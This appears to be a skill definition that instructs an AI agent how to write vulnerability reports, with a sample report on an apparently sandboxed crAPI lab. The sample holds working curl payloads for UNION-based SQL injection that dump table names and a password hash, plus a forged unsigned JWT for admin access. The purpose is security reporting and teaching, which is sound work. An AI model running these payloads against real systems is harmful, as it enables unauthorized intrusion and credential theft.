---
name: gen-report
description: Generate a vulnerability report based on the results of a vulnerability scan.
---

# gen-report

## Overview
To generate a vulnerability reprort, use the `gen-report` skill. This skill takes the results of a vulnerability scan and produces a detailed report that can be used for analysis and communication.

### Summary by vulnerability type, severity, and affected assets.

Detail summary of vulnerability types referencing OWASP Top 10 2025 in file `./REFERENCE.md`

- **A01:2025 - Broken Access Control:**: 
- **A02:2025 - Security Misconfiguration:** 
- **A03:2025 - Software Supply Chain Failures:** 
- **A04:2025 - Cryptographic Failures:** 
- **A05:2025 - Injection:** 
- **A06:2025 - Insecure Design:** 
- **A07:2025 - Authentication Failures**
- **A08:2025 - Software or Data Integrity Failures**
- **A09:2025 - Security Logging and Alerting Failures**
- **A10:2025 - Mishandling of Exceptional Conditions**

## Instructions

1. Ensure you have the results of a vulnerability scan available in main session
2. Use the `gen-report` skill with sub-agent `gen-report-sub-agent` to generate a vulnerability report based on the scan results.
3. Report components include:
   - **Summary:** Summary of vulnerabilities by type, severity, and affected assets (API and parameters).
   - **Prerequisites:** List of prerequisites for each vulnerability, such as required access levels or specific conditions that must be met for exploitation.
   - **Exploitation Steps:** Detailed steps for exploiting each vulnerability, including any necessary tools or techniques.
   - **Proof of Impact:** Evidence demonstrating the impact of the vulnerability, such as screenshots, logs, or data exfiltration examples.
   - **Remediation Steps:** Recommended steps for mitigating or fixing each vulnerability, including code changes, configuration adjustments, or other necessary actions.
4. Export the generated report in Markdown format for easy sharing and documentation.

## Example Usage

### A05:2025 - PostgreSQL SQL Injection via Coupon Validation

**Summary:**
- **Vulnerable location:** `/workshop/api/shop/apply_coupon` endpoint, `coupon_code` parameter
- **Overview:** Complete SQL injection exploitation achieving database version disclosure, table enumeration, and sensitive data extraction via UNION-based queries
- **Impact:** Full database compromise with extraction of user credentials and system information
- **Severity:** Critical

**Prerequisites:**
- Valid JWT authentication token
- POST request with both `coupon_code` and `amount` parameters

**Exploitation Steps:**

1. **Authenticate and obtain JWT token:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": "Admin!123"}'
```
Response: JWT token in the `token` field

2. **Confirm SQL injection vulnerability:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' OR 1=1--", "amount": 100}'
```
Response: `{"message":"TESTCOUPON20 Coupon code is already claimed by you!! Please try with another coupon code"}`

3. **Extract database version information:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT version()--", "amount": 100}'
```
Response: `{"message":"PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"}`

4. **Extract current database user:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT user--", "amount": 100}'
```
Response: `{"message":"admin Coupon code is already claimed by you!! Please try with another coupon code"}`

5. **Extract database name:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT current_database()--", "amount": 100}'
```
Response: `{"message":"crapi Coupon code is already claimed by you!! Please try with another coupon code"}`

6. **Enumerate all table names:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT string_agg(table_name, '\'','\'') FROM information_schema.tables WHERE table_schema='\''public'\''--", "amount": 100}'
```
Response: `{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,user_login,otp,mechanic,django_migrations,django_content_type,auth_permission,auth_group,auth_group_permissions,auth_user_groups,auth_user_user_permissions,auth_user,django_admin_log,service_request,product,applied_coupon,order,health_check_db_testmodel,django_session Coupon code is already claimed by you!! Please try with another coupon code"}`

7. **Extract sensitive user credentials:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT email||'\'':'\''||password FROM user_login LIMIT 5--", "amount": 100}'
```
Response: `{"message":"test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG Coupon code is already claimed by you!! Please try with another coupon code"}`

**Proof of Impact:**
- **Database Version Extracted:** PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1)
- **Database User:** admin (high privileges)
- **Database Name:** crapi
- **Complete Table Enumeration:** 25 tables including sensitive user data
- **Password Hash Extracted:** test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG (BCrypt hash)

### A07:2025 - JWT 'None' Algorithm Authentication Bypass

**Summary:**
- **Vulnerable location:** JWT validation accepts unsigned tokens with `"alg": "none"`
- **Overview:** Complete authentication bypass using unsigned JWT tokens
- **Impact:** Full access to admin account without any cryptographic verification
- **Severity:** Critical

**Prerequisites:** None

**Exploitation Steps:**

1. Create unsigned JWT token with admin privileges:
   - Header: `{"alg": "none"}`
   - Payload: `{"sub": "admin@example.com", "iat": 1758655244, "exp": 1759260044, "role": "admin"}`
   - Signature: Empty (unsigned token format: `header.payload.`)

2. Test unsigned token:
```bash
curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ." "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

**Proof of Impact:**
- HTTP 200 response with full admin dashboard access
- Retrieved sensitive admin account information including credentials
- Complete bypass of all authentication mechanisms

## Best Practices

- Allways using this skill after completing a vulnerability scan to ensure that all findings are accurately documented and communicated.
- Alway validation **Exploitation Steps** before generating the report to ensure accuracy and relevance.
- Alway run this skill with the `gen-report-sub-agent` to ensure the report is generated in the correct format and includes all necessary components.
- Regularly update the vulnerability types and references to align with the latest OWASP Top 10 2025 and other relevant security standards.
- Use the generated report to communicate findings effectively with stakeholders and guide remediation efforts.


